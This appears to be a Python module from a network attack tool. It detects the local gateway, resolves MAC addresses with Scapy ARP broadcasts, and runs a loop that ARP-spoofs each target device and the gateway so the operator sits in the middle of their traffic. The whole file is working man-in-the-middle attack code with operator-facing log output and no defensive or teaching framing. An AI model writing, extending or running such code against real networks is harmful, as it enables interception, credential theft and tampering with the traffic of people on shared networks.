import logger
import commands
import socket
import psutil
import subprocess
import re
import os
import time
import utils
from colorama import Fore, Style
import TILMnetworkingUtils

if os.name=="nt": # Scapy is kamene in windows
    import kamene.all as kamene
else:
    import scapy.all as kamene

global_timeout = 2
run = False
shouldQuit = False

def get_gateway_ip():
    """
    Get the IP address of the gateway the system is connected to.
    Works on both Linux and Windows.

    Returns:
        str: Gateway IP address or None if not found.
    """
    try:

        if os.name == 'nt':  # For Windows
            # Use `route print`
            result = subprocess.run(["route", "print"], capture_output=True, text=True, check=True)
            output = result.stdout
            # Find the gateway using regex
            match = re.search(r'\n\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)', output)
            if match:
                return match.group(1)

        else: # For Non windows
            # Use `ip route` 
            result = subprocess.run(["ip", "route"], capture_output=True, text=True, check=True)
            output = result.stdout
            # Find the gateway using regex
            match = re.search(r'default via (\S+)', output)
            if match:
                return match.group(1)

    except Exception as e:
        print(f"Error occurred: {e}")

    return None

def get_mac(ip):
    """
    Desc: Retrieves the MAC address of the device associated with a given IP address.
    Args: 
        ip (str): The IP address of the target device.
    Returns: 
        str: The MAC address of the device.
    """
    arp_request = kamene.ARP(pdst = ip)  # Create an ARP request to the given IP
    broadcast = kamene.Ether(dst ="ff:ff:ff:ff:ff:ff")  # Broadcast address
    arp_request_broadcast = broadcast / arp_request  # Combine Ethernet frame and ARP request
    answered_list = kamene.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]  # Send request and capture responses
    return answered_list[0][1].hwsrc  # Return the MAC address of the responding device


def arpspoof_thread():
    """
    Desc: The arp spoofing thread
    Args: none
    """

    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip)

    while True:

        if shouldQuit:
            break

        if run:

            for target in commands.target_devices:
                try:
                    ip = target.getIp()  # Get the IP address of the device
                    hostname = target.getHostname()  # Get the hostname of the device
                    mac = target.getMac()  # Get the MAC address of the device

                    logger.printInfo(f"Spoofing for {Fore.YELLOW}{ip}{Style.RESET_ALL} || {Fore.YELLOW}{mac}{Style.RESET_ALL} || ({Fore.YELLOW}{hostname}{Style.RESET_ALL})")
                    
                    TILMnetworkingUtils.spoof(ip, mac, gateway_ip)
                    TILMnetworkingUtils.spoof(gateway_ip, gateway_mac, ip)

                except AttributeError:
                    logger.printError(commands.nonDeviceType)
                    pass

            time.sleep(global_timeout)
        
        else:
            time.sleep(0.3)
    return